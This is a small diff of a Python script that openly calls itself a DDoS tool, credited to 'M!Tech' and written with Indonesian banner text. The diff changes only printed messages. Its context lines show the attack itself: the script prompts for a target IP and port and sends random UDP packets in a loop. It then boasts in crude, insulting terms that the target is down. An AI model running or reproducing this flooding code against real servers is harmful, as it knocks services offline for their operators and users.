@@ -7,7 +7,7 @@ import threading
 import os
 
 os.system("clear")
-print("DDoS Tools ByRdNs M!Tech")
+print("Tools By RdNs M!Tech")
 print("Pasti Tembus Nih Kalau M!Tech Yang Ddos")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
@@ -25,7 +25,7 @@ def run():
         s.sendto(data,addr)
       print(i +" Down lu anjing tools M!Tech nih")
     except:
-      print("[!] M!Tech Menyerang Server")
+      print("[!] DAH LAH CAPEK M!TECH RDP LU NGAK KUAT")
 
 def run2():
   data = random._urandom(16)
